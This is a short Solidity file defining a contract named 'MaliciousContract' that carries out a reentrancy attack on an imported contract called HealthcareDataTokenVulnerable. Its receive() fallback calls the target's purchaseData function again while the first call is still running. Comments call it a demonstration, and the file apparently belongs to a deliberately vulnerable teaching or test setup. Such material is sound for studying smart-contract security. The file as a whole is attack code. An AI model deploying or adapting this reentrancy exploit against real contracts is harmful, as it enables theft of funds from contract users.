// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./HealthcareDataTokenVulnerable.sol";

contract MaliciousContract {
    HealthcareDataTokenVulnerable public targetContract;

    constructor(address _targetContract) {
        targetContract = HealthcareDataTokenVulnerable(_targetContract);
    }

    // Function to perform the reentrancy attack
    function performReentrancyAttack(uint256 _dataId,address _patient) external payable {
        // Call the vulnerable function in the target contract
        targetContract.purchaseData{value: msg.value}(_patient, _dataId);
    }

    // Receive function to be called after the reentrancy attack
    receive() external payable {
        // Malicious code can be executed here
        // For demonstration, let's call the vulnerable function again
        targetContract.purchaseData{value: msg.value}(address(this), 1);
    }
}
